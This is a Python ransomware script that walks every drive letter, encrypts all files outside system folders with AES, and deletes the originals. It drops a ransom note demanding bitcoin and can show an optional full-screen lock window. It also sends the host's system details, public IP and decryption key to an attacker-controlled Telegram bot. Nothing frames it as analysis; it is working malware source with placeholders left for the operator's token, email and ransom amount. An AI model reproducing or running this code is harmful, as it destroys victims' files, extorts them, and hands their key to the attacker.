from _typeshed import Self
from string import ascii_lowercase , ascii_uppercase , digits , punctuation 
from pyAesCrypt import encryptFile
from os import walk , path, remove, environ 
from requests import post , get
import tkinter as tk
from tkinter import *
from random import randint , sample
from platform import uname
from getpass import getuser

class Ransomware(object):

    def __init__(self):
        self.KEY = ''# Generate Random Key For Encrypt
        self.CHAT_ID = 'chat id telegram (int)'
        self.TOKEN = 'TOKEN-BOT'
        self.EMAIL = 'your email'
        self.AMOUNT = 'amount to decrypter Files' 
        self.DRIVE = ('A:','C:','B:','D:','E:','F:','G:','H:','I:',
                        'J:','K:','L:','M:','N:','O:','P:','Q:',
                            'R:','S:','T:','U:','V:','W:','X:','Y:','Z:')
        self.EXCLUDE_DIRECTORY = (
                            #Windows system directory
                            'Program Files',
                            'Program Files (x86)',
                            'Windows',
                            '$RECYCLE.BIN',
                            'AppData',
                            'logs',)  

    def generate_pasword(self):
        password = ascii_lowercase + ascii_uppercase + digits
        temp = sample(password,30)
        password = "".join(temp)
        self.KEY = password                                     

    def find_files(self):
        list_files_ = []
        for drive_target in self.DRIVE:
            for  root,dirs,files in walk(drive_target,topdown = False):
                for name in files:
                    if any(EXCLUDE in name for EXCLUDE in self.EXCLUDE_DIRECTORY) or any(EXCLUDE in root for EXCLUDE in self.EXCLUDE_DIRECTORY):
                        pass
                    else:
                        if path.isdir(path.join(root,name)):
                            pass
                        else:
                            list_files_.append(path.join(root,name))
                for name in dirs:
                    if any(EXCLUDE in name for EXCLUDE in self.EXCLUDE_DIRECTORY) or any(EXCLUDE in root for EXCLUDE in self.EXCLUDE_DIRECTORY):
                        pass
                    else:
                        if path.isdir(path.join(root,name)):
                            pass
                        else:
                            list_files_.append(path.join(root,name))

        return list_files_                

    def send_to_telegram(self, token, caht_id , text):
        try:
            url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={caht_id}&text={text}'

            deta = {
                'UrlBox': url,
                'AgentList': 'Mozilla Firefox',
                'VersionsList': ' HTTP/1.1',
                'MethodList': 'GET'
            }
            re = post('https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx', data=deta)
        except:
            pass
    

    def encrypter(self,filenames):
        try:
            for files in filenames:
                encryptFile(files,files+'[encrypt]', self.KEY)
                remove(files)
        except:
            print('fuck')

    def file_look_screen(self, AMOUNT, EMAIL):
        desktop_path = path.join(environ['USERPROFILE'], 'Desktop')
        file_ = open(desktop_path+'README.txt','w')
        text = 'YOUR FILES HAVE BEEN ENCRYPTED !!\n'
        text += 'YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A UNIQUE KEY !!\n'
        text += f'to decrypt them, send {AMOUNT} in bitcoin to BITCOIN_ADRESS, and them send proof of tranfer and your DIGITS to {EMAIL} !!\n'
        text += 'ENCRYPTED BY x0Crypt0 !!\n'
        file_.write(text)
        file_.close()

    def look_screen(self, AMOUNT, EMAIL):
        root= tk.Tk()
        width = root.winfo_screenwidth() # Get screen width
        height = root.winfo_screenheight() # Get screen height
        root.attributes('-fullscreen',True)

        canvas1 = tk.Canvas(root, width = width, height = height, bg='black') # Main window
        canvas1.pack()

        label1 = tk.Label(root, text='YOUR FILES HAVE BEEN ENCRYPTED !!') # Title
        label1.config(font=('helvetica', int(height/20)))
        label1.config(background='black', foreground='red')
        canvas1.create_window(int(width/2), int(height/15), window=label1)
        label1 = tk.Label(root, text='YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A UNIQUE KEY !!') # Title
        label1.config(font=('helvetica', int(height/50)))
        label1.config(background='black', foreground='red')
        canvas1.create_window(int(width/2), int(height/20)*8, window=label1)



        label1 = tk.Label(root, text=f'to decrypt them, send {AMOUNT} in bitcoin to BITCOIN_ADRESS, and them send proof of tranfer and your DIGITS to {EMAIL} !!') # Title
        label1.config(font=('helvetica', int(height/50)))
        label1.config(background='black', foreground='red')
        canvas1.create_window(int(width/2), int(height/20)*9, window=label1)

        label1 = tk.Label(root, text='ENCRYPTED BY x0Crypt0 !!')
        label1.config(font=('helvetica', int(height/50)))
        label1.config(background='black', foreground='red')
        canvas1.create_window(int(width/2), int(height/20)*10, window=label1)

    def sysinfo(self):
        sysinfo = '=================\n'
        sysinfo += '🔞New Target🔞\n'
        sysinfo += '================\n'
        sysinfo += f"System: {uname().system}\n"
        sysinfo += f"Node Name: {uname().node}\n"
        sysinfo += f"Release: {uname().release}\n"
        sysinfo += f"Machine: {uname().machine}\n"
        sysinfo += f"Ip : {get('http://ip.42.pl/raw').text}\n"
        sysinfo += f"Key : {self.KEY}\n"
        sysinfo += f"Version: {uname().version}\n"
        return sysinfo


    def main(self):
        self.generate_pasword()
        self.send_to_telegram(self.TOKEN,self.CHAT_ID , self.sysinfo())
        filenames = self.find_files()
        self.send_to_telegram(self.TOKEN,self.CHAT_ID , 'Start encrypting files !')
        self.encrypter(filenames)
        self.send_to_telegram(self.TOKEN,self.CHAT_ID , 'Finish encrypting files !')
        self.file_look_screen(AMOUNT=self.AMOUNT, EMAIL=self.EMAIL)
        #self.look_screen(AMOUNT=self.AMOUNT, EMAIL=self.EMAIL) #if you how shoe look sceen enable this
        self.send_to_telegram(self.TOKEN,self.CHAT_ID , 'Show lock screen !')



f = Ransomware()
f.main()
